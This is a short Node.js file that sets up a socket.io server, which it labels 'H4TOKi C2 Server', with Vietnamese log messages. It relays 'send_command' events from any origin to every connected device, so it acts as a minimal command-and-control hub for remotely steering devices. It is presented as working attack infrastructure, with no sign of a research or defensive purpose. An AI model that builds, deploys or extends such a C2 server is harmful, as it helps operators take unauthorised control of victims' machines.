const http = require('http');
const { Server } = require('socket.io');

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('H4TOKi C2 Server is Running...');
});

const io = new Server(server, {
  cors: { origin: "*" }
});

io.on('connection', (socket) => {
  console.log('Có thiết bị mới kết nối:', socket.id);

  socket.on('send_command', (data) => {
    console.log('Lệnh mới:', data.action);
    io.emit('receive_command', data);
  });

  socket.on('disconnect', () => {
    console.log('Thiết bị ngắt kết nối:', socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('Hệ thống đang chạy tại port: ' + PORT);
});
